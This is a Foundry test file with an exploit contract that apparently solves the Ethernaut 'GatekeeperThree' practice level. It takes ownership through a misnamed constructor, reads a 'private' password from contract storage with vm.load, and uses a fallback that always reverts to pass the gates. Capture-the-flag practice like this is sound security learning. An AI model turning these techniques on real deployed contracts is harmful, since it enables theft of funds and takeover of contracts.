// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/GatekeeperThree.sol";

contract MiddleMan {
    constructor() payable {}

    function attack(address prey, uint256 password) public {
        GatekeeperThree instance = GatekeeperThree(payable(prey));
        address(instance).call{value: 0.0011 ether}("");
        instance.construct0r();
        instance.getAllowance(password);
        instance.enter();
    }

    receive() external payable {
        revert();
    }
}

contract GatekeeperThreeTest is Test {
    GatekeeperThree instance;

    function setUp() public {
        instance = new GatekeeperThree();
        // instance = GatekeeperThree(payable(vm.envAddress("GATEKEEPER_THREE")));
    }

    function test() public {
        assertEq(instance.entrant(), address(0));

        instance.createTrick();
        SimpleTrick trick = SimpleTrick(instance.trick());
        // SimpleTrick trick = SimpleTrick(vm.envAddress("GATEKEEPER_THREE_TRICK"));
        // uint256 password = 1738764324;
        uint256 password = uint256(vm.load(address(trick), bytes32(uint256(2))));
        console.logUint(password);

        MiddleMan middleMan = new MiddleMan{value: 0.0011 ether}();
        middleMan.attack(address(instance), password);

        assertEq(instance.entrant(), msg.sender);
    }
}
